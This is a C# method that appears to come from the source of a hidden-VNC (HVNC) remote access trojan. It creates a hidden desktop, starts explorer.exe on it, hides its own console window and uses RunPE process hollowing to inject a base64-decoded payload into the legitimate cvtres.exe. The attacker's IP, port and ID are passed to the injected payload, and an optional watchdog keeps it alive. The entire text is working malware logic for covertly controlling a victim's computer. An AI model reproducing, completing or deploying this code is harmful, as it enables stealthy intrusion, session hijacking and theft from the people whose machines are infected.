	public static void StartHVNC(string port, string ip, string id, string mutex, string watch)
	{
		string name = "RemoteDesktop";
		IntPtr consoleWindow = HVNC.GetConsoleWindow();
		HVNC.g_hDesk = ScreenHelper.OpenDesktop(name);
		if (HVNC.g_hDesk == null)
		{
			HVNC.g_hDesk = ScreenHelper.CreateDesktop(name);
		}
		ScreenHelper.SetCurrent(HVNC.g_hDesk);
		if (watch.Contains("True"))
		{
			new dog("cvtres.exe");
		}
		try
		{
			HVNC.SA.bInheritHandle = -1;
			HVNC.SA.lpSecurityDescriptor = (IntPtr)0L;
			HVNC.hNewDesktop = HVNC.CreateDesktop("RemoteDesktop", (IntPtr)0L, (IntPtr)0L, 1u, 511u, HVNC.SA);
			PROCESS_INFORMATION processInformation = default(PROCESS_INFORMATION);
			STARTUP_INFORMATION startupInfo = default(STARTUP_INFORMATION);
			startupInfo.cb = Marshal.SizeOf(typeof(STARTUP_INFORMATION));
			startupInfo.lpDesktop = "RemoteDesktop";
			IntPtr intPtr = default(IntPtr);
			HVNC.CreateProcessA(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "Windows\\explorer.exe", null, intPtr, intPtr, inheritHandles: false, 0u, IntPtr.Zero, null, ref startupInfo, ref processInformation);
			HVNC.dLByte = Convert.FromBase64String("");
			HVNC.ShowWindow(consoleWindow, 0);
			if (Directory.Exists("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\"))
			{
				RunPE.TryRun("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe", id + " " + ip + " " + port + " " + mutex, HVNC.dLByte, compatible: true, hidden: true, "RemoteDesktop", HVNC.PID);
			}
			else if (Directory.Exists("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\"))
			{
				RunPE.TryRun("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe", id + " " + ip + " " + port + " " + mutex, HVNC.dLByte, compatible: true, hidden: true, "RemoteDesktop", HVNC.PID);
			}
		}
		catch (Exception)
		{
		}
	}
